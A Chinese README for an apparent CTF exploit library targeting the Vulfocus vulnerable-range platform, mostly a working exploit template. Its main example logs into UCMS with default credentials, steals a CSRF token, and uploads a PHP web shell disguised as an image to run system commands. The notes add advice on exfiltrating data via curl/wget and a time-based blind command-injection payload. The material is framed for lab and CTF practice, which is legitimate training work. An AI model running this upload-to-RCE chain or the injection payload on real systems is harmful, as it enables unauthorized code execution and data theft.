# VulfocusExp
这是一个Vulfocus靶场的Exploit库，致力于快速flag获取。

## 项目简介

本项目集成了常见 Web 框架和服务的漏洞利用脚本，采用模块化设计，支持自动化目标扫描、漏洞利用和 flag 提取。适用于渗透测试、CTF 竞赛和漏洞复现场景。

## 项目结构

```
.
├── tool/                      # 核心工具库
│   ├── base.py              # 基础工具（命令执行、flag匹配、进程管理）
│   ├── http_repeater.py    # 原始 HTTP 请求重放器
│   ├── http_server.py       # 简易 HTTP 服务器
│   ├── port_scan.py       # 端口服务检测
│   └── code.py           # 漏洞利用代码模板
│
├── [题目名].py            # 每道题的Exp解题实现
├── main.py                  # 主入口 （暂未实现）
└── README.md              
```

## 核心模块

### tool/base.py

基础工具模块，提供核心功能：

| 函数/类 | 功能 |
|---------|------|
| `match_flag(text)` | 从文本中提取 flag |
| `match_flags(text)` | 提取所有 flag |
| `get_local_ip()` | 获取本机出口 IP |
| `run_cmd(command)` | 同步执行 shell 命令 |
| `RunCmd(command)` | 非阻塞命令执行器 |
| `parse_ip_port(str)` | 解析 "ip:port,portoolt" 格式 |
| `process(ip_port, run)` | 遍历目标并执行利用 |

### tool/http_repeater.py

原始 HTTP 请求重放器，支持：

- 原始 HTTP 请求发送
- SSL/TLS 支持（可忽略证书验证）
- 自动处理 Chunked 编码
- 自动解压 Content-Encoding（gzip/deflate/brotli）
- 自动 Cookie 管理

### tool/http_server.py

简易 HTTP 服务器：

- `HttpEcho`: 回显服务器，接收请求体并触发回调
- `HttpFile`: 文件服务器，提供文件下载

### tool/port_scan.py

端口服务检测：识别 HTTP/HTTPS 服务

### tool/code.py

漏洞利用代码模板：包含各类漏洞的利用代码片段

## Exp实现

### Exp结构
```python
# 工具导入
import re

from tool.base import match_flag, process_with, get_local_ip, run_cmd
from tool.http_repeater import repeater
from tool.http_server import HttpEcho



# 核心exp函数，需要接受一个target返回元组
# target要求tuple[str, int]或str类型，由process或process_with自动注入
# 返回(ok,flag,error): tuple[bool, str | list[str], str]
def run(target: tuple[str, int]):
    exp1 = f"""POST /ucms/login.php HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

uuu_username=admin&uuu_password=123456
"""
    exp2 = f"""GET /ucms/index.php HTTP/1.1
Host: {target[0]}:{target[1]}

    """
    exp3 = f"""GET /ucms/index.php?do=sadmin_file HTTP/1.1
Host: {target[0]}:{target[1]}

"""
    cookie = ""
    resp = repeater(exp1)
    if not resp:
        return False, "", f"exp1:{resp.error}"
    cookie = resp.build_cookie()
    if not cookie:
        return False, "", "登录失败"
    resp = repeater(exp2, headers={"Cookie": cookie})
    if not resp:
        return False, "", f"exp2:{resp.error}"
    token_c4b0e4 = resp.build_cookie()
    if not token_c4b0e4:
        return False, "", "token_c4b0e4获取失败"
    cookie = f"{cookie}; {token_c4b0e4}"
    resp = repeater(exp3, headers={"Cookie": cookie})
    if not resp:
        return False, "", f"exp3:{resp.error}"
    uuu_token = re.search(r'<input type="hidden" name="uuu_token" value="(.+)">', resp.text())
    if not uuu_token:
        return False, "", f"exp3:uuu_token获取失败"
    uuu_token = uuu_token.group(1)


    exp4 = f"""POST /ucms/index.php?do=sadmin_file&dir=/ucms HTTP/1.1
Host: {target[0]}:{target[1]}
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJoJtEd5AXvPAAk2h
Referer: http://{target[0]}:{target[1]}/ucms/index.php?do=sadmin_file&dir=/ucms
Content-Length: 700

------WebKitFormBoundaryJoJtEd5AXvPAAk2h
Content-Disposition: form-data; name="uuu_token"

{uuu_token}
------WebKitFormBoundaryJoJtEd5AXvPAAk2h
Content-Disposition: form-data; name="uploadfile"; filename="flag.php"
Content-Type: image/png

<?php @system("ls /tmp")?>
------WebKitFormBoundaryJoJtEd5AXvPAAk2h--

"""
    exp5 = f"""POST /ucms/flag.php HTTP/1.1
Host: {target[0]}:{target[1]}

"""
    resp = repeater(exp4, headers={"Cookie": cookie})
    if not resp:
        return False, "", resp.error
    resp = repeater(exp5, headers={"Cookie": cookie})
    if not resp:
        return False, "", resp.error



    flag = match_flag(resp.text())
    if not flag:
        print(resp.text())
        return False, "", "flag匹配失败"

    return True, flag, ""

# Exp主入口
# 需要根据情况选择使用process和process_with
def main(ip_port: str):
    process_with(ip_port, run)


# 提供快速命令行调用入口
if __name__ == "__main__":
    main("192.168.192.148:42740")

```

## 注意事项
- 尽量使用curl，wget的post请求带出数据，在缺少curl,wget工具时使用f'$(bash -c "test "$(ls /tmp | grep flag- | head -c{pos} | tail -c1)" = "{c}" && sleep 2")'。尽量避免反弹shell。
- 验证poc/exp可行后需要完成与该项目兼容且符合结构的[题目名].py 并进行测试，直到exp完善。
- 